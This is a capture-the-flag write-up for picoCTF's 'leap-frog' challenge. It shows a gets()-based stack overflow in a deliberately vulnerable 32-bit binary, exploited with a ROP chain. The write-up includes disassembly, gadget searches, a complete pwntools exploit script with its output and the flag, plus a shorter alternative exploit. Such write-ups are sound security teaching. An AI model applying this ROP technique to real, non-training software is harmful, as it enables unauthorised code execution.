# leap-frog
Binary Exploitation, 300 points

## Description:
> Can you jump your way to win in the following program and get the flag?

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdbool.h>


#define FLAG_SIZE 64

bool win1 = false;
bool win2 = false;
bool win3 = false;

void leapA() {
  win1 = true;
}

void leap2(unsigned int arg_check) {
  if (win3 && arg_check == 0xDEADBEEF) {
    win2 = true;
  }
  else if (win3) {
    printf("Wrong Argument. Try Again.\n");
  }
  else {
    printf("Nope. Try a little bit harder.\n");
  }
}

void leap3() {
  if (win1 && !win1) {
    win3 = true;
  }
  else {
    printf("Nope. Try a little bit harder.\n");
  }
}

void display_flag() {
  char flag[FLAG_SIZE];
  FILE *file;
  file = fopen("flag.txt", "r");
  if (file == NULL) {
    printf("'flag.txt' missing in the current directory!\n");
    exit(0);
  }

  fgets(flag, sizeof(flag), file);
  
  if (win1 && win2 && win3) {
    printf("%s", flag);
    return;
  }
  else if (win1 || win3) {
    printf("Nice Try! You're Getting There!\n");
  }
  else {
    printf("You won't get the flag that easy..\n");
  }
}

void vuln() {
  char buf[16];
  printf("Enter your input> ");
  return gets(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
}

```

Note: Initially, the binary posted with the challenge had PIE enabled. After a while, the binary was replaced with a version with PIE disabled, and that's the version used for this solution.

## Solution:

We need to take over the stack using the buffer overflow in `vuln`, and use it to direct the flow execution: We must set `win1`, `win2` and `win3` to `true`, and finally call `display_flag` in order to get the flag.

This challenge is similar to last year's [rop chain](/2018_picoCTF/rop%20chain.md), however there's a twist: We can't call `leap3` directly, since its condition for setting `win3` to `true` can't be satisfied: `if (win1 && !win1)`. Therefore we must create a ROP-chain pieces together several gadgets in order to set `win3` to `true`.

What if we could skip the `if (win1 && !win1)` part and jump directly to `win3 = true;`?

Let's take a look at `leap3`:

```
root@kali:/media/sf_CTFs/pico/leap-frog# r2 rop
 -- Search returned no hits. Did you mean 'Misassemble'?
[0x080484d0]> aaa
[Cannot analyze at 0x080484c0g with sym. and entry0 (aa)
[x] Analyze all flags starting with sym. and entry0 (aa)
[Cannot analyze at 0x080484c0ac)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for objc references
[x] Check for vtables
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.
[0x080484d0]> s sym.leap3
[0x08048666]> agf
[0x08048666]>  # sym.leap3 ();
                                .-------------------------------------.
                                |  0x8048666                          |
                                | (fcn) sym.leap3 77                  |
                                |   sym.leap3 ();                     |
                                | ; var int32_t var_4h @ ebp-0x4      |
                                | push ebp                            |
                                | mov ebp, esp                        |
                                | push ebx                            |
                                | sub esp, 4                          |
                                | call sym.__x86.get_pc_thunk.ax;[oa] |
                                | add eax, 0x198e                     |
                                | movzx edx, byte [eax + 0x3d]        |
                                | test dl, dl                         |
                                | je 0x8048699                        |
                                `-------------------------------------'
                                        f t
                                        | |
                                        | '----------------------.
                         .--------------'                        |
                         |                                       |
                     .---------------------------------.         |
                     |  0x8048682                      |         |
                     | movzx edx, byte [eax + 0x3d]    |         |
                     | xor edx, 1                      |         |
                     | test dl, dl                     |         |
                     | je 0x8048699                    |         |
                     `---------------------------------'         |
                             f t                                 |
                             | |                                 |
                             | '--------.                        |
    .------------------------'          |                        |
    |                                   | .----------------------'
    |                                   | |
.-----------------------------.   .----------------------------------------------------.
|  0x8048690                  |   |  0x8048699                                         |
| mov byte [eax + 0x3f], 1    |   | ; CODE XREFS from sym.leap3 @ 0x8048680, 0x804868e |
| jmp 0x80486ad               |   | sub esp, 0xc                                       |
`-----------------------------'   | lea edx, [eax - 0x1724]                            |
    v                             | ; const char *s                                    |
    |                             | push edx                                           |
    |                             | mov ebx, eax                                       |
    |                             | ; int puts(const char *s)                          |
    |                             | call sym.imp.puts;[ob]                             |
    |                             | add esp, 0x10                                      |
    |                             `----------------------------------------------------'
    |                                 v
    |                                 |
    '------------------.              |
                       | .------------'
                       | |
                 .----------------------------------------.
                 |  0x80486ad                             |
                 | ; CODE XREF from sym.leap3 @ 0x8048697 |
                 | nop                                    |
                 | mov ebx, dword [var_4h]                |
                 | leave                                  |
                 | ret                                    |
                 `----------------------------------------'
```

The command that sets `win3` to `true` is `mov byte [eax + 0x3f], 1`. However, we can't jump directly to it - our `eax` value won't match the address of `win3`. 

`eax` gets its value from:
```assembly
call sym.__x86.get_pc_thunk.ax;[oa]
add eax, 0x198e
```

However if we jump all the way there, we will fail the checks related to `win1 && !win1`.

Therefore, we need to find a way to directly modify `win3` (`0x0804a03f`):
```
[0x08048666]> is~win
045 ---------- 0x0804a03d GLOBAL    OBJ    1 win1
046 ---------- 0x0804a03f GLOBAL    OBJ    1 win3
064 ---------- 0x0804a03e GLOBAL    OBJ    1 win2
```

Once that's done, we can call `leap2` and `leapA` in order to set `win2` and `win1` to `true`, and continue to `display_flag` in order to get the flag.

We start by using `ROPgadget` to check which gadgets allow us to write to a memory address:
```
root@kali:/media/sf_CTFs/pico/leap-frog# ROPgadget --binary rop  | grep "\["
...
0x080485f3 : mov byte ptr [eax + 0x3d], 1 ; nop ; pop ebp ; ret
...
```

From the options provided by the tool, the best one actually seemed like the one we already met in `leap3`, adding `0x3d` to `eax` and setting the value to `1`. We just need to make sure that `eax == 0x0804a03f - 0x3d == 0x804a002` before jumping to that command.

How do we set `eax` to `0x804a002`? Couldn't find anything easy like `pop`-ing a value from the stack (which we control) into `eax`. There was a gadget that allowed `pop`-ing into `ebx`, but no easy way to transfer from `ebx` to `eax`. The best thing I could find was a gadget which adds a value to `al`:
```assembly
0x08048ac0 : add al, byte ptr [ebp - 0x3b] ; ret
``` 

Therefore, my strategy was as follows:

1. Set `eax` to a value very close to the address of `win3`. This can be accomplished by simply calling `leapA`, which leaves `eax`'s value as the address of `win1` when exiting the function.
2. Add the missing delta (`&win3 - &win1 = 0x0804a03f - 0x0804a03d = 2`) to `eax` by using the gadget at `0x08048ac0`. Since we control `ebp`, we can point it to an address which satisfies the condition `ebp - 0x3b == 2`:
```
[0x080484d0]> /x 02000000
Searching 4 bytes in [0x804a03c-0x804a040]
hits: 0
Searching 4 bytes in [0x8049f08-0x804a03c]
hits: 1
Searching 4 bytes in [0x8048000-0x8048bbc]
hits: 6
0x08049f80 hit1_0 02000000
0x080480b4 hit1_1 02000000
0x08048180 hit1_2 02000000
0x080481ac hit1_3 02000000
0x08048344 hit1_4 02000000
0x08048a20 hit1_5 02000000
0x08048bb0 hit1_6 02000000
```
3. Call the gadget at `0x080485f3` to set `win3` to `1`.
4. Proceed with calling the other functions...

Here's our final ROP chain:
```
    0x0000:        0x80485e6 leapA()
    0x0004:        0x8048ac0 add al, byte ptr [ebp - 0x3b] ; ret
    0x0008:        0x80485f3 mov byte ptr [eax + 0x3d], 1 ; nop ; pop ebp ; ret
    0x000c:       0xbabababa popped into ebp
    0x0010:        0x80485fd leap2(0xdeadbeef)
    0x0014:        0x8048409 <adjust @0x1c> pop ebx; ret
    0x0018:       0xdeadbeef arg0
    0x001c:        0x80485e6 leapA()
    0x0020:        0x80486b3 display_flag()
```

The following script will print the flag:
```python
# First, generate a pwntools template using:
# pwn template --host 2019shell1.picoctf.com --user dvdalt --path /problems/leap-frog_3_5d6cea2f1cec97458549353ec1e7e158/rop

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

import os
import numpy as np

if shell is not None:
    shell.set_working_directory(os.path.dirname(remote_path))

def send_payload(proc, payload):
    proc.sendlineafter("Enter your input> ", payload)


def get_overflow_offset():
    # It's problematic to create a core dump on an NTFS file system,
    # so reconfigure core dumps to be created elsewhere
    os.system("echo ~/core/core_dump > /proc/sys/kernel/core_pattern")
    os.system("rm core.* > /dev/null")
    proc = process(exe.path)
    payload = cyclic(50, n = exe.bytes)
    send_payload(proc, payload)
    proc.wait()
    offset = cyclic_find(proc.corefile.fault_addr, n = exe.bytes )
    log.info("Overflow offset: {} ({}-byte architecture)".format(offset, exe.bytes))
    return offset


overflow_offset = get_overflow_offset()
log.info("leapA() address: {}".format(hex(exe.symbols["leapA"])))
log.info("leap2() address: {}".format(hex(exe.symbols["leap2"])))
log.info("leap3() address: {}".format(hex(exe.symbols["leap3"])))
log.info("display_flag() address: {}".format(hex(exe.symbols["display_flag"])))

log.info("win1 address: {}".format(hex(exe.symbols["win1"])))
log.info("win2 address: {}".format(hex(exe.symbols["win2"])))
log.info("win3 address: {}".format(hex(exe.symbols["win3"])))

location_of_2 = next(exe.search(p32(2)))
log.info("location_of_2 address: {}".format(hex(location_of_2)))

rop = ROP(context.binary)
rop.leapA()
rop.raw(0x08048ac0) # add al, byte ptr [ebp - 0x3b] ; ret
rop.raw(0x080485f3) # mov byte ptr [eax + 0x3d], 1 ; nop ; pop ebp ; ret
rop.raw(0xBABABABA) # popped into ebp
rop.leap2(0xDEADBEEF)
rop.leapA()
rop.display_flag()

log.info("ROP: \n{}".format(rop.dump()))

ebp = p32(location_of_2 + 0x3b)
log.info("EBP: {}".format(hex(u32(ebp))))

payload = fit({overflow_offset - len(ebp): ebp + str(rop)}, filler = 'A')
log.info("Payload: \n{}".format(hexdump(payload)))

io = start()
send_payload(io, payload)
print io.recvall()
```

Output:
```console
root@kali:/media/sf_CTFs/pico/leap-frog# python exploit.py
[*] '/media/sf_CTFs/pico/leap-frog/rop'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Connecting to 2019shell1.picoctf.com on port 22: Done
[*] dvdalt@2019shell1.picoctf.com:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
[+] Opening new channel: 'pwd': Done
[+] Receiving all data: Done (13B)
[*] Closed SSH channel with 2019shell1.picoctf.com
[*] Working directory: '/tmp/tmp.zh7aJOoGFI'
[+] Opening new channel: 'ln -s /home/dvdalt/* .': Done
[+] Receiving all data: Done (0B)
[*] Closed SSH channel with 2019shell1.picoctf.com
[*] Working directory: '/problems/leap-frog_3_5d6cea2f1cec97458549353ec1e7e158'
[+] Starting local process '/media/sf_CTFs/pico/leap-frog/rop': pid 3054
[*] Process '/media/sf_CTFs/pico/leap-frog/rop' stopped with exit code -11 (SIGSEGV) (pid 3054)
[+] Parsing corefile...: Done
[*] '/media/sf_CTFs/pico/leap-frog/core.3054'
    Arch:      i386-32-little
    EIP:       0x61616168
    ESP:       0xffecda80
    Exe:       '/media/sf_CTFs/pico/leap-frog/rop' (0x8048000)
    Fault:     0x61616168
[*] Overflow offset: 28 (4-byte architecture)
[*] leapA() address: 0x80485e6
[*] leap2() address: 0x80485fd
[*] leap3() address: 0x8048666
[*] display_flag() address: 0x80486b3
[*] win1 address: 0x804a03d
[*] win2 address: 0x804a03e
[*] win3 address: 0x804a03f
[*] location_of_2 address: 0x80480b4
[*] Loaded cached gadgets for 'rop'
[*] ROP:
    0x0000:        0x80485e6 leapA()
    0x0004:        0x8048ac0
    0x0008:        0x80485f3
    0x000c:       0xbabababa
    0x0010:        0x80485fd leap2(0xdeadbeef)
    0x0014:        0x8048409 <adjust @0x1c> pop ebx; ret
    0x0018:       0xdeadbeef arg0
    0x001c:        0x80485e6 leapA()
    0x0020:        0x80486b3 display_flag()
[*] EBP: 0x80480ef
[*] Payload:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    00000010  41 41 41 41  41 41 41 41  ef 80 04 08  e6 85 04 08  │AAAA│AAAA│····│····│
    00000020  c0 8a 04 08  f3 85 04 08  ba ba ba ba  fd 85 04 08  │····│····│····│····│
    00000030  09 84 04 08  ef be ad de  e6 85 04 08  b3 86 04 08  │····│····│····│····│
    00000040
[+] Starting remote process '/problems/leap-frog_3_5d6cea2f1cec97458549353ec1e7e158/rop' on 2019shell1.picoctf.com: pid 2657143
[+] Receiving all data: Done (50B)
[*] Stopped remote process 'rop' on 2019shell1.picoctf.com (pid 2657143)
picoCTF{h0p_r0p_t0p_y0uR_w4y_t0_v1ct0rY_0db32718}
```

## Alternative Solution:

An alternative solution which is much simpler is to use `gets` to set all three globals to `true` (thanks to [Yaakov](https://twitter.com/YaakovCohen88) for this elegant solution):

```python
overflow_offset = get_overflow_offset()
log.info("win1 address: {}".format(hex(exe.symbols["win1"])))
log.info("display_flag() address: {}".format(hex(exe.symbols["display_flag"])))

rop = ROP(context.binary)
rop.gets(exe.symbols["win1"])
rop.display_flag()

log.info("ROP: \n{}".format(rop.dump()))

payload = fit({overflow_offset: str(rop)})
io = start()
send_payload(io, payload)
io.sendline("\x01\x01\x01")
print io.recvall()
```

